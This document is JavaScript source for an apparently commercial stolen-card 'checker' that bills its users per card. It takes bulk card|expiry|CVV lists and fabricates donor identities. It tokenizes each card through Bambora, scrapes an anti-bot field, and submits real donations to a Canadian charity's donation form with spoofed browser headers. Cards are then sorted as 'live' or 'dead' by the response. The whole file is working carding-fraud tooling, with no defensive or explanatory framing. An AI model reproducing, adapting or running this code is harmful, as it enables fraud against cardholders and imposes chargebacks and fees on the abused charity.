// ---- BAMBORA CHARGE ----
const bamboraInput = $('bamboraInput');
const bamboraAmount = $('bamboraAmount');
const bamboraPasteBtn = $('bamboraPasteBtn');
const bamboraCheckBtn = $('bamboraCheckBtn');
const bamboraResult = $('bamboraResult');
const bamboraLiveCount = $('bamboraLiveCount');
const bamboraDeadCount = $('bamboraDeadCount');
const bamboraTotalCount = $('bamboraTotalCount');
const bamboraLiveBtn = $('bamboraLiveBtn');
const bamboraDeadBtn = $('bamboraDeadBtn');
const bamboraAllBtn = $('bamboraAllBtn');

let bamboraResults = [];

function formatBamboraLine(line) {
    try {
        const parts = line.split(/[|/,\s]+/).filter(p => p.length > 0);
        if (parts.length < 4) return null;
        let cc = parts[0].replace(/\D/g, '');
        let mm = parts[1].replace(/\D/g, '');
        let yy = parts[2].replace(/\D/g, '');
        let cvv = parts[3].replace(/\D/g, '');
        if (mm.length === 1) mm = '0' + mm;
        else if (mm.length > 2) mm = mm.slice(-2);
        if (yy.length === 4) yy = yy.slice(-2);
        return { cc, mm, yy, cvv };
    } catch (e) { return null; }
}

function getCardType(card) {
    const first = card.charAt(0);
    if (first === '4') return 'Visa';
    if (first === '5') return 'MasterCard';
    if (card.startsWith('34') || card.startsWith('37')) return 'Amex';
    if (card.startsWith('6')) return 'Discover';
    return 'Visa';
}

function generateRandomData() {
    const names = ['Ahmet', 'Mehmet', 'Ali', 'Veli', 'Ayse', 'Fatma', 'Zeynep', 'Emre', 'Can', 'Berk'];
    const surnames = ['Yılmaz', 'Demir', 'Kaya', 'Çelik', 'Şahin', 'Öztürk', 'Aydın', 'Polat', 'Kara', 'Arslan'];
    const streets = ['Atatürk Cd.', 'İstiklal Cd.', 'Cumhuriyet Cd.', 'Bahçe Sk.', 'Gül Sk.', 'Lale Sk.', 'Çınar Sk.'];
    const cities = ['Istanbul', 'Ankara', 'Izmir', 'Bursa', 'Antalya', 'Adana', 'Konya'];
    const countries = ['TR', 'US', 'GB', 'DE', 'FR', 'CA'];
    const name = names[Math.floor(Math.random() * names.length)];
    const surname = surnames[Math.floor(Math.random() * surnames.length)];
    return {
        firstName: name,
        lastName: surname,
        email: name.toLowerCase() + Math.floor(Math.random() * 999) + '@gmail.com',
        street: streets[Math.floor(Math.random() * streets.length)] + ' ' + (Math.floor(Math.random() * 50) + 1),
        city: cities[Math.floor(Math.random() * cities.length)],
        postal: String(Math.floor(Math.random() * 90000) + 10000),
        country: countries[Math.floor(Math.random() * countries.length)]
    };
}

async function bamboraCharge(cc, mm, yy, cvv, amount) {
    try {
        const cardType = getCardType(cc);
        const data = generateRandomData();
        const yearFull = '20' + yy;

        // 1. Token al
        const tokenResp = await fetch('https://api.na.bambora.com/scripts/tokenization/tokens', {
            method: 'POST',
            headers: {
                'Accept': '*/*',
                'Content-Type': 'text/plain; charset=UTF-8',
                'Origin': 'https://libs.na.bambora.com',
                'Referer': 'https://libs.na.bambora.com/',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (Chrome)'
            },
            body: JSON.stringify({ number: cc, expiry_month: mm, expiry_year: yearFull, cvd: cvv })
        });
        const tokenJson = await tokenResp.json();
        const token = tokenJson.token;
        if (!token) return { status: 'Token error' };

        // 2. Session başlat (bot_check al)
        const sessionResp = await fetch('https://donate.kinvia.ca/single.php', {
            method: 'GET',
            headers: { 'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36' }
        });
        const html = await sessionResp.text();
        const botCheckMatch = html.match(/name="bot_check"\s+value="([^"]+)"/);
        const botCheck = botCheckMatch ? botCheckMatch[1] : '';

        // 3. Donate post
        const formData = new URLSearchParams();
        formData.append('amount', amount);
        formData.append('donor_type', 'Personal');
        formData.append('card_name', data.firstName + ' ' + data.lastName);
        formData.append('FirstName', data.firstName);
        formData.append('LastName', data.lastName);
        formData.append('Email', data.email);
        formData.append('StreetAddr', data.street);
        formData.append('City', data.city);
        formData.append('PostalCode', data.postal);
        formData.append('country', data.country);
        formData.append('act', 'pay');
        formData.append('CreditCardType', cardType);
        formData.append('token', token);
        formData.append('bot_check', botCheck);
        formData.append('language', 'e');

        const donateResp = await fetch('https://donate.kinvia.ca/donate.php', {
            method: 'POST',
            headers: {
                'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://donate.kinvia.ca',
                'Referer': 'https://donate.kinvia.ca/single.php'
            },
            body: formData
        });
        const resultHtml = await donateResp.text();

        // Sonuç analizi
        if (resultHtml.includes('TRANSACTION UNSUCCESSFUL') || resultHtml.includes('authorization for this transaction')) {
            return { status: 'Declined' };
        } else if (resultHtml.includes('Thank you') || resultHtml.includes('success')) {
            return { status: 'Approved' };
        } else {
            return { status: 'Unknown' };
        }
    } catch (e) {
        return { status: 'Error: ' + e.message.slice(0, 30) };
    }
}

function renderBamboraResults(filter = 'all') {
    let filtered = [];
    if (filter === 'all') filtered = bamboraResults;
    else if (filter === 'live') filtered = bamboraResults.filter(r => r.status === 'Approved');
    else if (filter === 'dead') filtered = bamboraResults.filter(r => r.status !== 'Approved');

    if (!filtered.length) {
        bamboraResult.innerHTML = '<div style="color:var(--text-muted);text-align:center;padding:16px;">No results.</div>';
        return;
    }
    let html = '';
    filtered.forEach(r => {
        const statusColor = r.status === 'Approved' ? '#34c759' : '#ff3b30';
        html += `
            <div style="padding:4px 0;border-bottom:1px solid var(--border-color);display:flex;justify-content:space-between;flex-wrap:wrap;gap:4px;">
                <span style="font-family:monospace;">Card: ${r.cc}|${r.mm}|${r.yy}|${r.cvv}</span>
                <span style="font-weight:600;color:${statusColor};">Resp: ${r.status}</span>
            </div>
        `;
    });
    bamboraResult.innerHTML = html;
}

function updateBamboraCounts() {
    const live = bamboraResults.filter(r => r.status === 'Approved').length;
    const dead = bamboraResults.length - live;
    bamboraLiveCount.textContent = live;
    bamboraDeadCount.textContent = dead;
    bamboraTotalCount.textContent = bamboraResults.length;
}

if (bamboraPasteBtn) {
    bamboraPasteBtn.addEventListener('click', async function() {
        try {
            const text = await navigator.clipboard.readText();
            const lines = text.split('\n').map(l => l.trim()).filter(l => l);
            const cleaned = lines.map(l => {
                const parts = l.split(/[|/,\s]+/).filter(p => p.length > 0);
                if (parts.length >= 4) {
                    const cc = parts[0].replace(/\D/g, '');
                    const mm = parts[1].replace(/\D/g, '').padStart(2, '0').slice(0,2);
                    const yy = parts[2].replace(/\D/g, '').slice(0,2);
                    const cvv = parts[3].replace(/\D/g, '').slice(0,4);
                    return `${cc}|${mm}|${yy}|${cvv}`;
                }
                return l;
            });
            bamboraInput.value = cleaned.join('\n');
            showToast('Pasted and cleaned.', 'success');
        } catch (e) {
            showToast('Cannot read clipboard, paste manually.', 'error');
        }
    });
}

if (bamboraCheckBtn) {
    bamboraCheckBtn.addEventListener('click', async function() {
        const lines = bamboraInput.value.split('\n').map(l => l.trim()).filter(l => l);
        if (!lines.length) { showToast('Enter cards.', 'error'); return; }

        const amount = parseFloat(bamboraAmount.value) || 10;
        const cost = lines.length * 1;
        if (currentUser.balance < cost) {
            showToast(`Insufficient balance! Need ${cost} TL (1 TL/card).`, 'error');
            return;
        }

        bamboraResults = [];
        bamboraResult.innerHTML = '<div style="color:var(--text-muted);text-align:center;padding:16px;font-weight:600;">Checking...</div>';
        this.disabled = true;
        this.textContent = 'Checking...';

        try {
            for (const line of lines) {
                const formatted = formatBamboraLine(line);
                if (!formatted) {
                    bamboraResults.push({ cc: line, mm: '??', yy: '??', cvv: '??', status: 'Format Error' });
                    continue;
                }
                const { cc, mm, yy, cvv } = formatted;
                const result = await bamboraCharge(cc, mm, yy, cvv, amount);
                bamboraResults.push({ cc, mm, yy, cvv, status: result.status });
                updateBamboraCounts();
                renderBamboraResults('all');
            }
        } catch (err) {
            showToast('Error occurred during check.', 'error');
        } finally {
            currentUser.balance -= cost;
            saveUsers();
            updateUI();
            bamboraInput.value = '';
            this.disabled = false;
            this.textContent = 'Start Check (1 TL/card)';
            updateBamboraCounts();
            renderBamboraResults('all');
            showToast(`Checked ${lines.length} cards. Cost: ${cost} TL deducted.`, 'success');
        }
    });
}

if (bamboraLiveBtn) {
    bamboraLiveBtn.addEventListener('click', function() {
        [bamboraLiveBtn, bamboraDeadBtn, bamboraAllBtn].forEach(b => b.classList.remove('active'));
        this.classList.add('active');
        renderBamboraResults('live');
    });
}
if (bamboraDeadBtn) {
    bamboraDeadBtn.addEventListener('click', function() {
        [bamboraLiveBtn, bamboraDeadBtn, bamboraAllBtn].forEach(b => b.classList.remove('active'));
        this.classList.add('active');
        renderBamboraResults('dead');
    });
}
if (bamboraAllBtn) {
    bamboraAllBtn.addEventListener('click', function() {
        [bamboraLiveBtn, bamboraDeadBtn, bamboraAllBtn].forEach(b => b.classList.remove('active'));
        this.classList.add('active');
        renderBamboraResults('all');
    });
}
